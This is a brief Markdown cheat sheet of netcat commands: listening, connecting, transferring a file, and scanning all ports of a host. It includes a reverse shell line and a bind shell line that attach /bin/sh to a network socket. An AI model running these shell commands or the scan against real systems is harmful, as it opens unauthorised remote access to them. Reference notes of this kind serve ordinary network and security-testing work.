# nc, ncat, netcat

concatenate and redirect sockets

## listen on the specified port

* don't resolve hostnames via DNS (`n`)
* display connection information (`v`)

```
nc -lnv <port>
```

on old/Windows versions of Netcat you have to specify the listening port via `-p <port>`

## connect to a netcat server

```
nc <host> <port>
```

## reverse shell

```
nc -e /bin/sh <host> <port>
```

## bind shell

```
nc -le /bin/sh <port>
```

## download file

#### 1. receiving end

```
nc -lnv <port> > <file>
```

#### 2. sending end

```
cat <file> | nc -nv <host> <port>
```

## port scanner

* zero-I/O mode (`z`)
* `$((0xffff))` evaluates to `65535`
* redirect standard error to standard out to be able to use `grep`

```
nc -v -z <host> 1-$((0xffff)) 2>&1 | grep "succeeded!"
```

## [...](https://nmap.org/book/ncat-man.html)
